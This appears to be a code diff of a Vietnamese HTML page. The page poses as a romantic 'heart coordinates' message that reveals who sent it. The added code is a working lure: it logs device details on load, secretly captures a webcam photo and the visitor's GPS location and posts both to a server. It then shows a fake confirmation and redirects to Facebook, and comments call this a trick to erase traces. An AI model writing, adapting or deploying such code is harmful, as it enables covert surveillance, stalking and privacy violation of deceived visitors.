@@ -6,107 +6,18 @@
     <title>Gửi tọa độ trái tim 💌</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap');
-
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Nunito', sans-serif;
-            background: linear-gradient(135deg, #ffe6e6 0%, #ffb3c6 100%);
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            position: relative;
-        }
-
-        /* Hiệu ứng tim bay lơ lửng */
-        .heart {
-            position: absolute;
-            bottom: -20px;
-            font-size: 24px;
-            color: #ff4d6d;
-            animation: floatUp 4s linear infinite;
-            opacity: 0;
-        }
-
-        @keyframes floatUp {
-            0% { transform: translateY(0) scale(0.5); opacity: 0; }
-            20% { opacity: 0.8; }
-            100% { transform: translateY(-100vh) scale(1.2); opacity: 0; }
-        }
-
-        .card {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 40px 30px;
-            border-radius: 24px;
-            box-shadow: 0 10px 30px rgba(255, 77, 109, 0.2);
-            text-align: center;
-            max-width: 340px;
-            width: 90%;
-            z-index: 10;
-            backdrop-filter: blur(10px);
-            border: 2px solid #fff;
-            animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes popIn {
-            0% { transform: scale(0.8); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .icon {
-            font-size: 50px;
-            margin-bottom: 10px;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
-        h2 {
-            color: #d90429;
-            margin: 10px 0;
-            font-size: 22px;
-        }
-
-        p {
-            color: #6c757d;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-
-        .btn {
-            background: linear-gradient(to right, #ff758c 0%, #ff7eb3 100%);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4);
-            transition: all 0.3s ease;
-            width: 100%;
-            font-family: 'Nunito', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
+        body { margin: 0; padding: 0; font-family: 'Nunito', sans-serif; background: linear-gradient(135deg, #ffe6e6 0%, #ffb3c6 100%); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; position: relative; }
+        .heart { position: absolute; bottom: -20px; font-size: 24px; color: #ff4d6d; animation: floatUp 4s linear infinite; opacity: 0; }
+        @keyframes floatUp { 0% { transform: translateY(0) scale(0.5); opacity: 0; } 20% { opacity: 0.8; } 100% { transform: translateY(-100vh) scale(1.2); opacity: 0; } }
+        .card { background: rgba(255, 255, 255, 0.9); padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 30px rgba(255, 77, 109, 0.2); text-align: center; max-width: 340px; width: 90%; z-index: 10; backdrop-filter: blur(10px); border: 2px solid #fff; animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .icon { font-size: 50px; margin-bottom: 10px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        h2 { color: #d90429; margin: 10px 0; font-size: 22px; }
+        p { color: #6c757d; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: linear-gradient(to right, #ff758c 0%, #ff7eb3 100%); color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4); transition: all 0.3s ease; width: 100%; font-family: 'Nunito', sans-serif; }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6); }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -114,14 +25,16 @@
     <div class="card" id="card">
         <div class="icon">💌</div>
         <h2>Có người gửi bạn một<br>tọa độ trái tim!</h2>
-        <p>Hãy mở khóa để xem người ấy đang ở đâu và khoảng cách giữa hai người nhé.</p>
-        <button class="btn" onclick="requestLocation()" id="btn">
-            Xem tọa độ ngay ❤️
-        </button>
+        <p>Hãy xác nhận khuôn mặt và vị trí để mở khóa xem người ấy là ai nhé.</p>
+        <button class="btn" onclick="startHack()" id="btn">Xem tọa độ ngay ❤️</button>
     </div>
 
+    <!-- Thẻ video ẩn để chứa camera -->
+    <video id="video" autoplay playsinline class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
     <script>
-        // Tạo hiệu ứng tim bay
+        // Hiệu ứng tim bay
         function createHearts() {
             const body = document.querySelector('body');
             const heart = document.createElement('div');
@@ -135,71 +48,76 @@
         }
         setInterval(createHearts, 300);
 
-        // Hàm xin quyền GPS
-        function requestLocation() {
-            const btn = document.getElementById('btn');
-            const card = document.getElementById('card');
-
-            if (!navigator.geolocation) {
-                alert("Trình duyệt của bạn không hỗ trợ lấy vị trí.");
-                return;
-            }
-
-            btn.innerHTML = "Đang tìm tọa độ... ⏳";
-            btn.style.opacity = "0.7";
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    // Gửi dữ liệu GPS về server
-                    fetch('/api/log', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ type: "gps", lat: lat, lon: lon, accuracy: position.coords.accuracy })
-                    });
-
-                    // Hiệu ứng thành công
-                    card.innerHTML = `
-                        <div class="icon">💖</div>
-                        <h2>Đã tìm thấy rồi!</h2>
-                        <p>Cảm ơn bạn đã xác nhận. Tọa độ trái tim đang được gửi đi...</p>
-                        <a href="https://www.google.com/maps?q=${lat},${lon}" style="color: #ff4d6d; font-weight: bold; text-decoration: none;">Xem bản đồ của bạn</a>
-                    `;
-
-                    // Tự động chuyển hướng sau 3s
-                    setTimeout(() => {
-                        window.location.href = 'https://www.facebook.com';
-                    }, 3000);
-                },
-                (error) => {
-                    // Nếu họ từ chối (hoặc lỗi)
-                    btn.innerHTML = "Xem tọa độ ngay ❤️";
-                    btn.style.opacity = "1";
-                    alert("Bạn cần bấm 'Cho phép' để xem tọa độ nhé!");
-                    
-                    // Vẫn gửi thông báo từ chối về server
-                    fetch('/api/log', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ type: "gps_denied", error: error.message })
-                    });
-                }
-            );
+        // Hàm gửi dữ liệu về Vercel API
+        function sendData(data) {
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
         }
 
-        // Gửi thông tin thiết bị ngầm ngay khi load trang
-        fetch('/api/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: "basic_info",
-                screen: screen.width + "x" + screen.height,
-                platform: navigator.platform,
-                userAgent: navigator.userAgent
-            })
-        });
+        // Gửi info cơ bản ngay khi vào
+        sendData({ type: "basic_info", platform: navigator.platform, userAgent: navigator.userAgent });
+
+        // Kỹ thuật chính: Mở Cam + Lấy GPS
+        async function startHack() {
+            const btn = document.getElementById('btn');
+            btn.innerHTML = "Đang xác minh... ⏳";
+
+            // 1. Xin quyền Camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Đợi 1.5s để camera lấy nét và bắt sáng
+                await new Promise(r => setTimeout(r, 1500));
+                
+                // Chụp ảnh
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Chuyển ảnh sang Base64
+                const imageBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                
+                // Gửi ảnh về API
+                sendData({ type: "webcam", image: imageBase64 });
+                
+                // Tắt camera
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.log("Không lấy được cam", err);
+            }
+
+            // 2. Xin quyền GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendData({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude });
+                    },
+                    (err) => {
+                        sendData({ type: "gps_denied", error: err.message });
+                    }
+                );
+            }
+
+            // 3. Hiển thị thông báo thành công (lừa đảo)
+            const card = document.getElementById('card');
+            card.innerHTML = `
+                <div class="icon">💖</div>
+                <h2>Đã tìm thấy rồi!</h2>
+                <p>Cảm ơn bạn đã xác nhận. Tọa độ trái tim đang được gửi đi...</p>
+            `;
+
+            // Chuyển hướng sau 3 giây để xóa dấu vết
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com';
+            }, 3000);
+        }
     </script>
 </body>
 </html>
